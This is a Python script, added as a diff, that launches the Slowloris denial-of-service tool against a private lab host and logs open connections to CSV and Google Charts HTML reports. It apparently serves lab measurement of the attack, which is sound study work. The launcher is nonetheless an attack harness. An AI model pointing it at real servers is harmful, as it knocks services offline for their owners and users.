@@ -1,0 +1,232 @@
+#!/usr/bin/env python3
+import subprocess
+import time
+from datetime import datetime
+import shlex
+import os
+
+# -----------------------------------------
+# Slowloris Experiment Launcher + Logger
+# -----------------------------------------
+# - Launches Slowloris against a target
+# - Samples open TCP connections every second
+# - Writes CSV + HTML report
+# -----------------------------------------
+
+# Parameters of the  LAB
+TARGET_HOST = "192.168.42.8"
+TARGET_PORT = 5000          # 5000 for Flask, 80 for Apache/Nginx
+SOCKETS = 300               # -s (number of Slowloris sockets)
+TEST_DURATION = 60         # seconds to sample / run the test
+
+# Path to 'ss' (usually just 'ss' in PATH)
+SS_CMD = "ss"
+
+
+def timestamp():
+    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+
+
+def run_command(cmd):
+    """Run a shell command and return (stdout, stderr, returncode)"""
+    try:
+        result = subprocess.run(
+            shlex.split(cmd),
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            check=False,
+        )
+        return result.stdout.strip(), result.stderr.strip(), result.returncode
+    except Exception as e:
+        return "", str(e), 1
+
+
+def start_slowloris():
+    """
+    Start Slowloris as a background process.
+    NOTE: Adjust arguments here if your 'slowloris --help'
+    shows different flags.
+    """
+    cmd = [
+        "slowloris",
+        TARGET_HOST,
+        "-p", str(TARGET_PORT),
+        "-s", str(SOCKETS),
+        "-v",
+        # More flags here if your version supports them [try slowloris -h , e.g.:
+        # "--sleeptime", "30",
+        # "--https",
+    ]
+
+    print(" Starting Slowloris with command:")
+    print("  " + " ".join(cmd))
+
+    # Start in background so we can sample connections
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+    )
+    return proc
+
+
+def sample_open_connections():
+    """
+    Count TCP connections from attacker (Kali) to TARGET_HOST:TARGET_PORT
+    using 'ss'. We filter by destination, because Kali is the client.
+    """
+    # Example: ss -tn dst 192.168.42.8:5000
+    cmd = f'{SS_CMD} -tn dst {TARGET_HOST}:{TARGET_PORT}'
+    stdout, stderr, rc = run_command(cmd)
+    if rc != 0:
+        print(f"⚠ Error running '{cmd}': {stderr}")
+        return None
+
+    lines = [line for line in stdout.splitlines() if line.strip()]
+    if not lines:
+        return 0
+
+    # First line is header, rest are connections
+    connection_lines = max(0, len(lines) - 1)
+    return connection_lines
+
+
+
+
+def write_csv(data_rows, csv_filename):
+    """
+    Write sampled data to CSV.
+    data_rows is a list of (second, connection_count).
+    """
+    with open(csv_filename, "w", encoding="utf-8") as f:
+        f.write("second,open_connections\n")
+        for sec, conn in data_rows:
+            f.write(f"{sec},{conn}\n")
+    print(f" CSV written: {csv_filename}")
+
+
+def write_html(data_rows, html_filename):
+    """
+    Write a simple HTML report using Google Charts, similar style
+    to SlowHTTPTest outputs.
+    """
+    # Prepare JS data rows: ['0', 123], ['1', 130], ...
+    js_rows = ",\n".join(
+        f"['{sec}', {conn}]"
+        for sec, conn in data_rows
+    )
+
+    html_content = f"""<!-- Slowloris Analysis chart -->
+<html>
+  <head>
+    <style>
+      body {{
+        font: 12px/18px "Lucida Grande", "Lucida Sans Unicode",
+              Helvetica, Arial, Verdana, sans-serif;
+        background-color: transparent;
+        color: #333;
+        -webkit-font-smoothing: antialiased;
+      }}
+      .slow_results {{ font-size: 12px; }}
+    </style>
+    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
+    <script type="text/javascript">
+      google.load("visualization", "1", {{packages:["corechart"]}});
+      google.setOnLoadCallback(drawChart);
+      function drawChart() {{
+        var data = new google.visualization.DataTable();
+        data.addColumn('string', 'Seconds');
+        data.addColumn('number', 'Open connections');
+        data.addRows([
+{js_rows}
+        ]);
+
+        var chart = new google.visualization.AreaChart(
+          document.getElementById('chart_div')
+        );
+        chart.draw(data, {{
+          width: 800,
+          height: 400,
+          title: 'Slowloris test against {TARGET_HOST}:{TARGET_PORT}',
+          hAxis: {{
+            title: 'Seconds',
+            titleTextStyle: {{color: '#FF0000'}}
+          }},
+          vAxis: {{
+            title: 'Open connections',
+            titleTextStyle: {{color: '#FF0000'}},
+            viewWindowMode: 'maximized'
+          }}
+        }});
+      }}
+    </script>
+    <title>Slowloris Connection Results</title>
+  </head>
+  <body>
+    <p>
+      <table class='slow_results' border='0'>
+        <tr><th>Test parameters</th></tr>
+        <tr><td><b>Attack type</b></td><td>Slowloris (Partial HTTP Request)</td></tr>
+        <tr><td><b>Target</b></td><td>{TARGET_HOST}:{TARGET_PORT}</td></tr>
+        <tr><td><b>Number of sockets</b></td><td>{SOCKETS}</td></tr>
+        <tr><td><b>Test duration</b></td><td>{TEST_DURATION} seconds</td></tr>
+      </table>
+    </p>
+    <div id="chart_div"></div>
+  </body>
+</html>
+"""
+    with open(html_filename, "w", encoding="utf-8") as f:
+        f.write(html_content)
+
+    print(f" HTML written: {html_filename}")
+
+
+def main():
+    ts = timestamp()
+    csv_filename = f"slowloris_{ts}.csv"
+    html_filename = f"slowloris_{ts}.html"
+
+    data_rows = []
+
+    # Start Slowloris in the background
+    slowloris_proc = start_slowloris()
+
+    print(f" Sampling open connections to {TARGET_HOST}:{TARGET_PORT} "
+          f"every 1 second for {TEST_DURATION} seconds...\n")
+
+    start_time = time.time()
+
+    try:
+        for sec in range(TEST_DURATION + 1):
+            elapsed = int(time.time() - start_time)
+            conn_count = sample_open_connections()
+            if conn_count is None:
+                conn_count = 0  # fallback if error
+
+            print(f"t={elapsed:3d}s  open_connections={conn_count}")
+            data_rows.append((elapsed, conn_count))
+            time.sleep(1)
+
+    finally:
+        # Attempt to stop Slowloris gracefully
+        print("\n Stopping Slowloris process...")
+        slowloris_proc.terminate()
+        try:
+            slowloris_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            slowloris_proc.kill()
+
+    # Write outputs
+    write_csv(data_rows, csv_filename)
+    write_html(data_rows, html_filename)
+
+    print("\n Test complete.")
+    print(f"   CSV:  {os.path.abspath(csv_filename)}")
+    print(f"   HTML: {os.path.abspath(html_filename)}")
+
+
+if __name__ == "__main__":
+    main()
